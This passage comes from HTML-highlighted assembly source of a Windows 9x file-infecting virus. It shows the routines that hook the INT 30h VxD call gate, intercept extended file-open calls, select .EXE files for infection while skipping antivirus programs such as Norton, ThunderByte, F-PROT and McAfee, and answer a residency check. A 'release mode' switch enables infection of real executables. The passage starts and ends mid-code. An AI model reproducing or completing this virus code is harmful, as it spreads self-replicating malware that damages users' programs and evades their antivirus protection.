    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1DFFh</span><span class="sc0">       </span><span class="sc1">;Next two bytes of instruction?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">TraceVxDCall_AddressFound</span><span class="sc0">   </span><span class="sc1">;Yes</span><span class="sc0">
</span><span class="sc5">TraceVxDCall_NextByte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">TraceVxDCall</span><span class="sc0">                </span><span class="sc1">;Continue Checking...</span><span class="sc0">

</span><span class="sc5">TraceVxDCall_AddressFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Save Current INT 30h Address</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">                                 </span><span class="sc1">;Cannot afford to be interrupted</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">                               </span><span class="sc1">;Skip over FF and 1D opcodes of CALL</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                               </span><span class="sc1">;Pointer to INT 30h instruction, XXXXXXXX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Copy Bytes From Here</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldInt30</span><span class="sc0">        </span><span class="sc1">;To Here</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                      </span><span class="sc1">;Save 6 bytes, FWORD</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;Install New INT 30h Handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Pointer to INT 30h instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDInt30Handler</span><span class="sc0"> </span><span class="sc1">;Copy This Address</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                               </span><span class="sc1">;Save 4 bytes ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                               </span><span class="sc1">;and 2 bytes (since FWORD instruction)</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">                                 </span><span class="sc1">;Handler installed, enable interrupts</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InstallHookProcedure</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                           VxDInt30Handler                              | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This is the hook procedure that monitors VxDCalls (INT 30h)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; None.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;___________________</span><span class="sc0">
</span><span class="sc5">VxDInt30Handler</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                          </span><span class="sc1">;Save all, since this is an interrupt handler</span><span class="sc0">

</span><span class="sc1">;Make sure that we don't process our own calls</span><span class="sc0">
        </span><span class="sc5">@OFFSET</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VxDCall_Busy</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                </span><span class="sc1">;Is Virus busy</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Exit_VxDInt30Handler</span><span class="sc0">                </span><span class="sc1">;Yes, prevent re-entrancy</span><span class="sc0">

</span><span class="sc1">;Process only INT 21h Services</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VWIN32_Int21Dispatch</span><span class="sc0">           </span><span class="sc1">;VWIN32 VxD int 21h?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit_VxDInt30Handler</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0000002Ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Get 21h Service</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RESIDENCY_CHECK_SERVICE</span><span class="sc0">         </span><span class="sc1">;Check for Residency?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Residency_Check</span><span class="sc0">                     </span><span class="sc1">;Yes</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LFN_OPEN_FILE_EXTENDED</span><span class="sc0">          </span><span class="sc1">;LFN Open Extended</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Extended_File_Open</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Exit_VxDInt30Handler</span><span class="sc0">                </span><span class="sc1">;None, go to default handler</span><span class="sc0">

</span><span class="sc5">Residency_Check</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Virus Residency Check</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                       </span><span class="sc1">;Restore stack and other regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RESIDENCY_SUCCESS</span><span class="sc0">              </span><span class="sc1">;Tell caller that we're resident</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Original_VxDInt30Handler</span><span class="sc0">            </span><span class="sc1">;Go to original handler</span><span class="sc0">

</span><span class="sc5">Extended_File_Open</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Prevent Re-entrancy</span><span class="sc0">
        </span><span class="sc5">@OFFSET</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VxDCall_Busy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IsFilenameOK</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">File_Not_Executable</span><span class="sc0">

</span><span class="sc1">;Do Stuff</span><span class="sc0">
        </span><span class="sc1">;call   OutputFileName</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">File_Not_Executable</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Finished Processing</span><span class="sc0">
        </span><span class="sc5">@OFFSET</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VxDCall_Busy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc5">Exit_VxDInt30Handler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                           </span><span class="sc1">;Restore, before transfering control</span><span class="sc0">

</span><span class="sc5">Original_VxDInt30Handler</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;The following bytes will be translated to JMP FWORD PTR CS:[00000000]</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc0">               </span><span class="sc1">;JMP FWORD PTR CS:[XXXXXXXX]</span><span class="sc0">
</span><span class="sc5">OldInt30Address</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;The following 4 bytes will be replaced by the</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                    </span><span class="sc1">;address of OldInt30 in memory.</span><span class="sc0">
        </span><span class="sc1">;ret                            ;Not required, since we're jumping out</span><span class="sc0">
</span><span class="sc5">VxDInt30Handler</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                            IsFilenameOK                                | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; Description</span><span class="sc0">
</span><span class="sc1">;   -&gt; This function checks if the filename is OK for infection or not. If the</span><span class="sc0">
</span><span class="sc1">;      filename meets any of the folling criteria, this function returns a</span><span class="sc0">
</span><span class="sc1">;      failure.</span><span class="sc0">
</span><span class="sc1">;           * Filename is less than 5 characters. This is checked, because</span><span class="sc0">
</span><span class="sc1">;             we are infecting only .EXE files, so the minimum length of such</span><span class="sc0">
</span><span class="sc1">;             a file is 5 characters</span><span class="sc0">
</span><span class="sc1">;           * The filename must end in ".EXE" (or ".XYZ" for DEBUG mode). The</span><span class="sc0">
</span><span class="sc1">;             comparison is case insensitive</span><span class="sc0">
</span><span class="sc1">;           * The filename must NOT consist of any of the following pairs of</span><span class="sc0">
</span><span class="sc1">;             characters, viz., "AV", "AN", "F-". This is done to prevent</span><span class="sc0">
</span><span class="sc1">;             infection of Anti-Virus program files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Arguments</span><span class="sc0">
</span><span class="sc1">;   -&gt; ife_szFilename:  Address of the buffer where the filename is stored</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Return Value:</span><span class="sc0">
</span><span class="sc1">;   -&gt; EAX: 1 if the filename is OK, 0 otherwise</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Registers Destroyed</span><span class="sc0">
</span><span class="sc1">;   -&gt; All</span><span class="sc0">
</span><span class="sc1">;___________________________________</span><span class="sc0">
</span><span class="sc5">IsFilenameOK</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">ife_szFilename</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">szExtention</span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">]:</span><span class="sc10">BYTE</span><span class="sc0">

</span><span class="sc1">;Check Filename Length</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ife_szFilename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">StringLength</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">       </span><span class="sc1">;Get length of filename</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;Is File name less than 5 characters (.EXE)</span><span class="sc0">
    </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">Error_IsFilenameOk</span><span class="sc0">      </span><span class="sc1">;Yes, Don't infect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;Save Length of Filename</span><span class="sc0">

</span><span class="sc1">;Get File Extention</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;File Extention (including ".")</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szExtention</span><span class="sc0">        </span><span class="sc1">;Get Address of Extention Buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;Store extention in buffer</span><span class="sc0">

</span><span class="sc1">;Convert to upper case</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">;3 characters to be converted</span><span class="sc0">
</span><span class="sc5">ToUpperCase</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;Don't have to check "." for upper case</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"a"</span><span class="sc0">
    </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">NextCharacter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"z"</span><span class="sc0">
    </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">NextCharacter</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"a"</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc0">   </span><span class="sc1">;Convert to upper case</span><span class="sc0">
</span><span class="sc5">NextCharacter</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">ToUpperCase</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;Get Length of Filename</span><span class="sc0">

</span><span class="sc1">;Check the Extention</span><span class="sc0">
    </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ZYX."</span><span class="sc0"> </span><span class="sc1">;Is Extention ".XYZ" (Debug Only)</span><span class="sc0">
    </span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc5">ERR</span><span class="sc0">     </span><span class="sc3">"Release Mode, Executables will be Infected !!!"</span><span class="sc0">    </span><span class="sc1">;Comment to assemble</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"EXE."</span><span class="sc0"> </span><span class="sc1">;Is Extention ".XYZ" (Release Only)</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Error_IsFilenameOk</span><span class="sc0">          </span><span class="sc1">;No, Extention doesn't match</span><span class="sc0">

</span><span class="sc1">;Check Anti-Virus Program Files</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;Since we're checking 2 char, last char not reqd</span><span class="sc0">
</span><span class="sc5">CheckAntiVirusFiles</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"VA"</span><span class="sc0">    </span><span class="sc1">;"AV"; for NAV (Norton), TBAV (ThunderByte)</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_IsFilenameOk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"va"</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_IsFilenameOk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"-F"</span><span class="sc0">    </span><span class="sc1">;"F-"; for F-PROT</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_IsFilenameOk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"NA"</span><span class="sc0">    </span><span class="sc1">;"AN", for SCAN (McAfee), CLEAN</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_IsFilenameOk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"na"</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Error_IsFilenameOk</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;Next Character</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CheckAntiVirusFiles</span><span class="sc0">     </span><span class="sc1">;Check All</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">End_IsFilenameOk</span><span class="sc0">

</span><span class="sc5">Error_IsFilenameOk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">End_IsFilenameOk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">IsFilenameOK</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| |                                                                        | |</span><span class="sc0">
</span><span class="sc1">;| +------------------------------------------------------------------------+ |</span><span class="sc0">
</span><span class="sc1">;+----------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc5">OutputFileName</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">dwFilename</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> \
            </span><span class="sc5">dwDeltaOffset</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwFilename</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@DELTA</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;Create File to write into</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwDeltaOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szOutputFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF77ADFh</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">End_OutputFileName</span><span class="sc0">

</span><span class="sc1">;Go to end of file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Save Handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF7713Fh</span><span class="sc0">                 </span><span class="sc1">;SetFilePointer</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Restore Handle</span><span class="sc0">

</span><span class="sc1">;Get Length of FileName</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Save Handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFilename</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF773ADh</span><span class="sc0">                 </span><span class="sc1">;lstrlen</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;length of filename</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Restore Handle</span><span class="sc0">

</span><span class="sc1">;Write Into File</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;save handle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;Create Buffer, used for number of bytes written</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwFilename</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0BFF76FD5h</span><span class="sc0">                  </span><span class="sc1">;WriteFile</span><span class="sc0">
